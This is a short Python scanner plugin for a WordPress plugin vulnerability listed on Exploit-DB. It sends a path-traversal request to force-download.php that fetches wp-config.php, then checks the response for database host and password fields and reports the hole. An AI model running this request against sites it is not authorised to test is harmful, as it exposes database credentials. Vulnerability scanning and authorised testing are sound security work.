#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#refer :http://www.exploit-db.com/exploits/34436/

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg + "wp-content/force-download.php?file=../wp-config.php"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('DB_HOST') != -1 and res.find('DB_PASSWORD') != -1:
        security_hole('Local File Inclusion Vulnerability:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://127.0.0.1/wordpress/')[1])